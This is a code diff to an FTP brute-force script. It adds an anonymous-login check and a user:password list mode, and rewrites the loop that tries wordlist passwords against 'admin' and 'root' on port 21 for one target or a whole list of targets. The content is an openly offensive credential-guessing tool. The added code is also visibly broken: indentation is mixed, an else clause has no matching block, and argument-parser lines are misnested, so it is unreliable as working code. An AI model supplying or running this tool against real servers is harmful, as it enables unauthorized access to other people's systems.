@@ -11,8 +11,10 @@ from ftplib import FTP
 info = '''
 Usage: ./ftpBrute.py [options]\n
 Options: -t, --target    <hostname/ip>   |   Target
+     -a, --anon    | Perform Anonymous test
 	 -tfile, --targetfile <filename> |   target list
 	 -w, --wordlist  <filename>      |   Wordlist
+     -upfile, --userpassfile  <filename>      |   User:Password list
 	 -h, --help      <help>          |   print help
 Example: ./ftpBrute.py -t 192.168.1.1 -w wordlist.txt
 '''
@@ -69,73 +71,100 @@ def ftp_login(target, username, password):
 	except:
 		pass
 
-def brute_force(target, username, wordlist):
+def brute_force(target, wordlist, username=None):
 	try:
 		wordlist = open(wordlist, "r")
 		words = wordlist.readlines()
-		for word in words:
-			word = word.strip()
-			check = ftp_login(target, username, word)
-			if check == 1:
-				return
-
+        for word in words:
+            if username is not None:
+                word = word.strip()
+                check = ftp_login(target, username, word)
+        else:
+            word = word.strip().split(':')
+            check = ftp_login(target, word[0], word[1])
+            if check == 1:
+                return
 	except:
 		print("\n[-] There is no such wordlist file.")
 		sys.exit(0)
 
 def main():
 	parser = argparse.ArgumentParser()
-	parser.add_argument("-t", "--target")
-	parser.add_argument("-w", "--wordlist")
-	parser.add_argument("-tfile", "--targetfile")
+    parser.add_argument("-t", "--target",
+                        help="Specify the target IP address to bruteforce [default: 127.0.0.1]",
+                        default="127.0.0.1")
+                        parser.add_argument("-a", "--anon",
+                                            help="Selecting this option the tool will test the anonymous login",
+                                            action="store_true")
+                        parser.add_argument("-w", "--wordlist", help="Provide a list of words to use as passwords")
+                        parser.add_argument("-upfile", "--userpassfile", help="The list of users and passwords separated by a colon ':'")
+                        parser.add_argument("-tfile", "--targetfile", help="Specify a list of IP addresses to use as targets")
 
 	args = parser.parse_args()
+    usernameList = list()
+    wordlist = list()
+    anonymousCheck = None
 
-
-	if not args.target and not args.targetfile or not args.wordlist:
+	if not args.target and not args.targetfile:
 		help()
 		sys.exit(0)
 
-	target = args.target
-	targetfile = args.targetfile
-	wordlist = args.wordlist
-	usernameList = ['admin', 'root']
+    target = args.target
+    targetfile = args.targetfile
 
-	if targetfile is not None:
-		newTargetList= []
-		try:
-			with open(targetfile) as data:
-				targetsList = data.read().splitlines()
+    if not args.userpassfile:
+        if not args.wordlist:
+            wordlist = ["word1", "word2"]
+    else:
+        wordlist = args.wordlist
+            usernameList = ['admin', 'root']
+        else:
+            userpassfile = args.userpassfile
 
-			for host in targetsList:
-				portOpen = check_server(host, 21)
+    if targetfile is not None:
+        newTargetList = []
+        try:
+            with open(targetfile) as data:
+                targetsList = data.read().splitlines()
+                
+                for host in targetsList:
+                    portOpen = check_server(host, 21)
+                    
+                    if portOpen is True:
+                        if args.anon is True:
+                            anonymousCheck = check_anonymous_login(host)
+                        if anonymousCheck is None:
+                            newTargetList.append(host)
+        
+            if usernameList:
+                for user in usernameList:  # prende uno user alla volta da qui e lo usa per testare le creds su tutti i target
+                    for host in newTargetList:
+                        brute_force(host, wordlist, user)
+                else:
+                    for host in newTargetList:
+                        brute_force(host, userpassfile)
 
-				if portOpen is True:
-					anonymousCheck = check_anonymous_login(host)
-					if anonymousCheck is None:
-						newTargetList.append(host)
-
-			for user in usernameList:
-				for host in newTargetList:
-					brute_force(host, user, wordlist)
-
-		except Exception as e:
-			print('brute: ', e)
-			sys.exit(1)
-
-	else:
-		portOpen = check_server(target, 21)
-		if portOpen is False:
-			print('port is closed')
-			sys.exit(0)
-		else:
-			anonymousCheck = check_anonymous_login(target)
-
-			if anonymousCheck is not None:
-				sys.exit(0)
-
-			for user in usernameList:
-				brute_force(target, user, wordlist)
+        except Exception as e:
+            print('brute: ', e)
+            sys.exit(1)
+        
+    else:
+        portOpen = check_server(target, 21)
+        if portOpen is False:
+            print('port is closed')
+            sys.exit(0)
+        else:
+            if args.anon is True:
+                anonymousCheck = check_anonymous_login(target)
+            
+            if anonymousCheck is not None:
+                sys.exit(0)
+            
+            if usernameList:
+                for user in usernameList:
+                    brute_force(target, wordlist, user)
+            else:
+                brute_force(target, userpassfile)
 
 if __name__ == '__main__':
 
